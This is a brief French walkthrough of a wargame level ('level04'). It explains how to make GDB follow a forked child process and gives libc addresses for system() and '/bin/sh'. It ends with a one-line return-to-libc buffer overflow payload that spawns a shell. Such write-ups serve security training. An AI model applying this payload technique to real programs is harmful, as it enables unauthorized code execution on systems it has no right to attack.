# Walkthrough

Ce niveau est globalement identique au niveau 01, avec l'exception que cette fois
le buffer overflow ce fait dans un processus enfant.

Ansi, par défaut, GDB ne va pas détecter les crashs du processus enfant. Pour
qu'il s'occupe de suivre le processus, il faut utiliser la commande
`set follow-fork-mode child`.

Avec ça, on peut utiliser la même méthode que dans le niveau 01.

| /bin/sh    | system     |
---------------------------
| 0xf7f897ec | 0xf7e6aed0 |

```
(python -c "print 'a' * 156 + '\xd0\xae\xe6\xf7' + '0000' + '\xec\x97\xf8\xf7' " ; cat -) | ./level04
```
